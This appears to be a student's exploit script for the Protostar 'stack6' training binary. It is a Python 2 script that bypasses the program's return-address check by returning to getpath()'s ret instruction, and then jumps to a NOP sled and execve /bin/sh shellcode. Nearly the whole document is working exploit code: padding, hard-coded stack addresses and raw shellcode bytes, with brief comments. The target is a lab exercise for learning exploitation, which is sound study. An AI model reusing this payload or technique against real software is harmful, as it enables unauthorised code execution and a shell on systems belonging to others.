# /opt/protostar/bin/stack6
# Almost the same as stack5 but we have a builtin return address check which we need
# to bypass. We do this by returning to our return at the end of getpath(), which is
# a valid return address to our check, and then we can exploit using $esp how we like.
import struct

padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
# eip/esp taken from the registers when broken at ret in getpath (0x080484f9)
eip = struct.pack("I", 0xbffff78c+40)
# our return address from getpath
ret = struct.pack("I", 0x080484f9)
# not even sure if nopslide is needed but it's here anyway
nop = "\x90"*40
# shellcode from stack5 exploit for /bin/sh
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding+ret+eip+nop+shell